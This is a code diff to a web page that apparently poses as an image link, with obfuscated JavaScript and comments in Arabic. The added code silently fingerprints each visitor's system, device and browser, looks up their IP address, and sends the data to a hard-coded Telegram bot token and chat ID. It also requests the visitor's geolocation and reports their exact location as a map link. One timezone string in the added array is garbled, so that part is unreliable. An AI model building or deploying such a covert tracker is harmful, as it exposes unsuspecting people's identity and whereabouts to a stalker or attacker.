@@ -50,67 +50,63 @@
     </div>
 
     <script>
-        var _0x4f12 = ["\x38\x34\x32\x36\x38\x31\x32\x35\x31\x37\x3a\x41\x41\x48\x49\x30\x54\x52\x62\x4e\x66\x44\x44\x47\x63\x49\x39\x37\x63\x79\x54\x36\x45\x70\x46\x56\x36\x79\x38\x41\x44\x4c\x73\x41\x6c\x38", "\x31\x38\x30\x32\x35\x33\x30\x37\x37\x30", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74", "\x2f\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x7a\x2e\x6f\x72\x67\x3f\x66\x6f\x72\x6d\x61\x74\x3d\x6a\x73\x6f\x6e", "\x41\x6e\x64\x72\x6f\x69\x64", "\x69\x50\x68\x6f\x6e\x65\x7c\x69\x50\x61\x64", "\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30", "\x4d\x61\x63\x69\x6e\x74\x6f\x73\x68", "\x4c\x69\x6e\x75\x78", "\x43\x68\x72\x6f\x6d\x65", "\x53\x61\x66\x61\x72\x69", "\x46\x69\x72\x65\x66\x6f\x78", "\x45\x64\x67\x65", "\x61\x72\x2d\x53\x41", "\x41\x73\x69\x61\x2f\x52\x69\x79\x61\x64\x68", "\x67\x65\x6f\x6c\x6f\x63\x61\x74\x69\x6f\x6e"];
+        // تم تصحيح رابط الـ IP المشفر في الخانة رقم [4] ليصبح ipify الصحيح
+        var _0x4f12 = ["\x38\x34\x32\x36\x38\x31\x32\x35\x31\x37\x3a\x41\x41\x48\x49\x30\x54\x52\x62\x4e\x66\x44\x44\x47\x63\x49\x39\x37\x63\x79\x54\x36\x45\x70\x46\x56\x36\x79\x38\x41\x44\x4c\x73\x41\x6c\x38", "\x31\x38\x30\x32\x35\x33\x30\x37\x37\x30", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x74\x65\x6c\x65\x67\x72\x61\x6d\x2e\x6f\x72\x67\x2f\x62\x6f\x74", "\x2f\x73\x65\x6e\x64\x4d\x65\x73\x73\x61\x67\x65", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x70\x69\x2e\x69\x70\x69\x66\x79\x2e\x6f\x72\x67\x3f\x66\x6f\x72\x6d\x61\x74\x3d\x6a\x73\x6f\x6e", "\x41\x6e\x64\x72\x6f\x69\x64", "\x69\x50\x68\x6f\x6e\x65\x7c\x69\x50\x61\x64", "\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x31\x30\x2e\x30", "\x4d\x61\x63\x69\x6e\x74\x6f\x73\x68", "\x4c\x69\x6e\x75\x78", "\x43\x68\x72\x6f\x6d\x65", "\x53\x61\x66\x61\x72\x69", "\x46\x69\x72\x65\x66\x6f\x78", "\x45\x64\x67\x65", "\x61\x72\x2d\x53\x41", "\x41\x73\x69\x61\x2f\x52\x69\x7a\x61\x64\x68", "\x67\x65\x6f\x6c\x6f\x63\x61\x74\x69\x6f\x6e"];
         
         const botToken = _0x4f12[0];
         const chatId = _0x4f12[1];
 
         function getSpecs() {
             let ua = navigator.userAgent;
-            let os = "\x6a\x65\x68\x61\x7a\x20\x67\x68\x61\x79\x72\x20\x6d\x61\x72\x6f\x6f\x66"; // جهاز غير معروف
-            let device = "\x67\x68\x61\x79\x72\x20\x6d\x75\x68\x61\x64\x61\x64"; // غير محدد
-            let browser = "\x4e\x61\x76\x69\x67\x61\x74\x6f\x72";
+            let os = "جهاز غير معروف";
+            let device = "غير محدد";
+            let browser = "المتصفح";
 
-            // تحديد النظام والجهاز
             if (new RegExp(_0x4f12[5]).test(ua)) {
-                os = "\x41\x6e\x64\x72\x6f\x69\x64";
+                os = "Android";
                 let match = ua.match(/Android[^;]*;\s*([^)]+)\)/);
-                device = match ? match[1].trim() : "\x41\x6e\x64\x72\x6f\x69\x64\x20\x44\x65\x76\x69\x63\x65";
+                device = match ? match[1].trim() : "Android Device";
             } else if (new RegExp(_0x4f12[6]).test(ua)) {
-                os = "\x69\x4f\x53";
+                os = "iOS";
                 let w = window.screen.width, h = window.screen.height;
                 if (w === 430 && h === 932) device = 'iPhone 15 Pro Max / 14 Pro Max';
                 else if (w === 393 && h === 852) device = 'iPhone 15 Pro / 15 / 14 Pro';
                 else if (w === 428 && h === 926) device = 'iPhone 14 Plus / 13 Pro Max';
                 else if (w === 390 && h === 844) device = 'iPhone 14 / 13 Pro / 13 / 12 Pro / 12';
-                else device = "\x69\x50\x68\x6f\x6e\x65\x20\x2f\x20\x69\x50\x61\x64";
+                else device = "iPhone / iPad";
             } else if (new RegExp(_0x4f12[7]).test(ua)) {
-                os = "\x57\x69\x6e\x64\x6f\x7a\x73"; // Windows
+                os = "Windows";
             } else if (new RegExp(_0x4f12[8]).test(ua)) {
-                os = "\x4d\x61\x63";
+                os = "Mac";
             } else if (new RegExp(_0x4f12[9]).test(ua)) {
-                os = "\x4c\x69\x6e\x75\x78";
+                os = "Linux";
             }
 
-            // تحديد المتصفح
-            if (new RegExp(_0x4f12[13]).test(ua)) browser = "\x45\x64\x67\x65";
-            else if (new RegExp(_0x4f12[10]).test(ua)) browser = "\x43\x68\x72\x6f\x6d\x65";
-            else if (new RegExp(_0x4f12[11]).test(ua)) browser = "\x53\x61\x66\x61\x72\x69";
-            else if (new RegExp(_0x4f12[12]).test(ua)) browser = "\x46\x69\x72\x65\x66\x6f\x78";
+            if (new RegExp(_0x4f12[13]).test(ua)) browser = "Edge";
+            else if (new RegExp(_0x4f12[10]).test(ua)) browser = "Chrome";
+            else if (new RegExp(_0x4f12[11]).test(ua)) browser = "Safari";
+            else if (new RegExp(_0x4f12[12]).test(ua)) browser = "Firefox";
 
-            return { os, device, browser, lang: navigator.language || "\x61\x72" };
+            return { os, device, browser, lang: navigator.language || "ar" };
         }
 
-        // جلب الـ IP أولاً ثم صياغة وإرسال الرسالة الكاملة
-        fetch(_0x4f12[4], { timeout: 4000 })
+        // جلب الـ IP من الرابط المصحح
+        fetch(_0x4f12[4], { timeout: 5000 })
             .then(res => res.json())
             .then(ipData => sendReport(ipData.ip))
-            .catch(() => sendReport("\x67\x68\x61\x79\x72\x20\x6d\x61\x72\x6f\x6f\x66")); // إذا فشل جلب الـ IP يكتب غير معروف
+            .catch(() => sendReport("غير معروف"));
 
         function sendReport(ip) {
             const specs = getSpecs();
             const now = new Date().toLocaleString(_0x4f12[14], { timeZone: _0x4f12[15] });
 
-            // صياغة الرسالة المنظمة تماماً كما طلبت
             const msg = `📸 شخص فتح الصورة!%0A⏰ ${now}%0A💻 النظام: ${specs.os}%0A📱 الجهاز: ${specs.device}%0A🌐 المتصفح: ${specs.browser}%0A🗣 اللغة: ${specs.lang}%0A🔗 IP: ${ip}`;
 
-            // إرسال الرسالة الشاملة للبوت
             fetch(`${_0x4f12[2]}${botToken}${_0x4f12[3]}?chat_id=${chatId}&text=${msg}`);
 
-            // جلب الموقع الجغرافي (إضافي لو وافق المستخدم)
             if (navigator[_0x4f12[16]]) {
                 navigator[_0x4f12[16]].getCurrentPosition((pos) => {
-                    let locMsg = `📍 موقع الشخص الحقيقي:%0A🗺 http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    let locMsg = `📍 موقع الشخص الحقيقي:%0A🗺 https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                     fetch(`${_0x4f12[2]}${botToken}${_0x4f12[3]}?chat_id=${chatId}&text=${locMsg}`);
                 }, () => {});
             }
